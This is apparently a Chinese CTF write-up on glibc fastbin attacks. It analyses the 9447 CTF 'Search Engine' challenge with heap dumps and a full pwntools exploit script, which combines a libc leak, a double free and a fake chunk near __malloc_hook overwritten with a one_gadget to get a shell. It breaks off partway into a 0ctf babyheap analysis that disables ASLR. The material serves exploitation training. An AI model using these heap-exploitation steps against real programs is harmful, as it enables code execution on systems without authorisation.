首先需要了解：
  1. fastbin大小system_mem 。
  * fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。
# Alloc to Stack
该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，当然同时需要栈上存在有满足条件的 size
值，从而把 fastbin chunk 分配到栈中，控制返回地址等关键数据。
# Arbitrary Alloc
与`Alloc to Stack`不尽相同，但它范围更广。只要满足目标地址存在合法的 size 域（这个 size
域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。  
比如利用`字节错位`等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。
# 例子
## [2015 9447 CTF : Search Engine](https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine/search)
### 分析
首先要搞懂程序流程
    menu
    1: Search with a word
    2: Index a sentence
    3: Quit
首先 2 写入句子，首先输入句子长度，且句子是由单词构成，每个单词后面都要加 空格 才能检测到，所以长度是带空格的长度  
1 查找单词，输入单词长度和单词，查找当前所有的句子中含有这个单词的句子，显示一条并询问是否删除，再往下显示  
我们输入句子长度为8的句子“how are ”
    0x603430 FASTBIN {
      prev_size = 0, 
      size = 49, 
      fd = 0x603420, 
      bk = 0x3, 
      fd_nextsize = 0x603420, 
      bk_nextsize = 0x8
    }
    0x603460 FASTBIN {
      prev_size = 0, 
      size = 49, 
      fd = 0x603424, 
      bk = 0x3, 
      fd_nextsize = 0x603420, 
      bk_nextsize = 0x8
    }
    pwndbg> x/20gx 0x603410
    0x603410:   0x0000000000000000  0x0000000000000021
    0x603420:   0x2065726120776f68  0x0000000000000000      ==>sentence
    0x603430:   0x0000000000000000  0x0000000000000031      ==>申请了0x30大小的chunk存放word
    0x603440:   0x0000000000603420  0x0000000000000003      ==>word1 how 的地址 长度
    0x603450:   0x0000000000603420  0x0000000000000008      ==>sentence 的地址 长度
    0x603460:   0x0000000000000000  0x0000000000000031      ==>同上
    0x603470:   0x0000000000603424  0x0000000000000003      ==>word2 are 的地址 长度
    0x603480:   0x0000000000603420  0x0000000000000008      ==>sentence 的地址 长度
    0x603490:   0x0000000000603440  0x0000000000000031
    0x6034a0:   0x00000000006034d0  0x0000000000000003
  1. 我们可以先创建一个unsorted bin大小的chunk，然后释放，该chunk将被填0，但是没有被设置为NULL。列表中只有者这一个 unsortedbin，释放后它的fd bk都将指向自己  
由于查找单词的时候没有限制'\x00'，所以通过'\x00'查找到最后，同时也没有截断，就可以连带打印出unsortedbin地址，libc_base =
unsorted_addr - 0x3c4b78。  
main_arena_offset = 0x3c4b20。这里libc里main_arena偏移在`malloc_trim`函数里找到。
  2. 由于存在`double free`漏洞  
首先申请大小相同的 a b c三块，然后依次释放 c b a(因为搜索的顺序跟添加顺序相反)。此时fast bin里
a->b->c->null，然后再次释放b就会导致 b->a->b->a…  
这里注意的就是 在再次释放b的时候，因为c的fd指向null所以不进入搜索，b第一个进入搜索，所以只再次释放第一个结果，其余的都不再释放。
        pwndbg> fastbin
    fastbins
    0x20: 0x2105150 ◂— 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x2105010 —▸ 0x2105170 —▸ 0x2105240 ◂— 0x0
    0x80: 0x0
    =======================
    double free之后
    =======================
    pwndbg> fastbin
    fastbins
    0x20: 0x2105150 ◂— 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x2105170 —▸ 0x2105010 ◂— 0x2105170
    0x80: 0x0
  3. 改写`__malloc_hook`为`one_gadget`。在malloc的时候，不会检查地址的对齐，只会检查size的大小是否符合。所以构造我们的堆块大小为0x60，这是因为(0x60+8)对齐16大小为0x70在fastbin[5]里，而0x7f刚好也对应着fastbin[5]。64位计算方法为 0x7f>>4 -2。而在main_arenahook处，很多地址都以0x7f开头，可以利用字节错位来构造假的size。（使用pwndbg的`find_fake_fast`）  
把前面申请的chunk a b c重新使用后，再次调用malloc时，就会跳转到one_gadget执行
    pwndbg> print (void*)&main_arena
    $2 = (void *) 0x7f4be2dc8b20 
    pwndbg> print (void*)&__malloc_hook
    $3 = (void *) 0x7f4be2dc8b10 
    pwndbg> x/10gx 0x7f4be2dc8b10
    0x7f4be2dc8b10 : 0x0000000000000000  0x0000000000000000
    0x7f4be2dc8b20 :    0x0000000000000000  0x00000000010f5150
    0x7f4be2dc8b30 : 0x0000000000000000  0x0000000000000000
    0x7f4be2dc8b40 : 0x0000000000000000  0x0000000000000000
    0x7f4be2dc8b50 : 0x0000000000000000  0x00000000010f5010
    pwndbg> find_fake_fast 0x7f4be2dc8b10 0x7f
    FAKE CHUNKS
    0x7f4be2dc8aed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA {
      prev_size = 5468175281376198656, 
      size = 127, 
      fd = 0x4be2a89e20000000, 
      bk = 0x4be2a89a0000007f, 
      fd_nextsize = 0x7f, 
      bk_nextsize = 0x0
    }
    pwndbg> print /x 0x7f4be2dc8b10-0x7f4be2dc8aed      # __malloc_hook - fake_chunk_addr
    $4 = 0x23                                           # padding = 0x23 - 0x10
    pwndbg> print /x 0x7f4be2dc8b20-0x7f4be2dc8aed      # main_arena - fake_chunk_addr
    $5 = 0x33
### exp
    #!usr/bin/python
    from pwn import *
    context.log_level = 'debug'
    binary = "./search"
    ip = ""
    port = 0
    elf = ELF(binary)
    def menu(choice):
        io.sendlineafter("Quit\n", str(choice))
    def search(word):
        menu(1)
        io.sendlineafter("size:\n", str(len(word)))
        io.sendafter("word:\n", word)
    def delete(yn):
        io.recvuntil("(y/n)?\n")
        io.sendline(yn)
    def index(sent):
        menu(2)
        io.sendlineafter("size:\n", str(len(sent)))
        io.sendafter("sentence:\n", sent)
    def pwn(ip, port, debug):
        global io
        if debug == 1:
            io = process(binary)
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")   
        else:
            io = remote(ip, port)
            libc = 0
        sent = 'a'*0x99 + ' b '
        index(sent)
        search('b')
        delete('y')
        search('\x00')
        io.recvuntil("Found " + str(len(sent)) + ": ")
        unsorted_addr = u64(io.recv(8))
        delete('n')
        print "unsorted_addr = " +hex(unsorted_addr)
        libc_base = unsorted_addr - 0x3c4b78
        main_arena_offset = 0x3c4b20
        main_arena = libc_base + main_arena_offset
        one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
        one_gadget = libc_base + one_gadget[3]
        sent = 'a' * 0x5d + ' c '       # 1
        index(sent)
        sent = 'a' * 0x5d + ' c '       # 2
        index(sent)
        sent = 'a' * 0x5d + ' c '       # 3
        index(sent)
        search('c')
        delete('y')
        delete('y')
        delete('y')     
        # main_arena -> 1 -> 2 -> 3 -> NULL
        search('\x00')
        delete('y')
        delete('n')
        delete('n')     
        # main_arena -> 2 -> 1 -> 2 -> 1 -> ...
        fake_chunk_addr = main_arena - 0x33
        index(p64(fake_chunk_addr).ljust(0x60, 'a'))
        index('b' * 0x60)
        index('c' * 0x60)
        sent = 'a' * 0x13 + p64(one_gadget)
        sent = sent.ljust(0x60, 'a')
        # gdb.attach(io)
        index(sent)
        io.interactive()
    if __name__ == '__main__':
        pwn(ip, port, 1)
做完感觉挺简单的...
## 0ctf2017 babyheap
保护全开  
功能：
    1. Allocate
    2. Fill
    3. Free
    4. Dump
    5. Exit
calloc的size是在`Allocate`中输入的。而`Fill`时size是重新输入的，可以造成堆溢出。  
（内存分配函数是calloc而不是malloc，calloc分配chunk时会对内存区域进行置空，也就是说之前的fd和bk字段都会被置为0）  
先关闭PIE方便调试
    sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
在gdb中使用
    skip function alarm
跳过alarm函数，方便调试，但是每次调试都需要执行这么一句。  
或者就通过patch二进制文件删除alarm函数
### 分析1
alloc四个fast chunk，一个small chunk
先释放1，再释放2
    pwndbg> x/40gx 0x555555757000
    0x555555757000: 0x0000000000000000  0x0000000000000021 ==>0
    0x555555757010: 0x0000000000000000  0x0000000000000000
    0x555555757020: 0x0000000000000000  0x0000000000000021 ==>1
    0x555555757030: 0x0000000000000000  0x0000000000000000
    0x555555757040: 0x0000000000000000  0x0000000000000021 ==>2
    0x555555757050: 0x0000555555757020  0x0000000000000000 ==>后入先出，所以chunk2的fd指向chunk1
    0x555555757060: 0x0000000000000000  0x0000000000000021 ==>3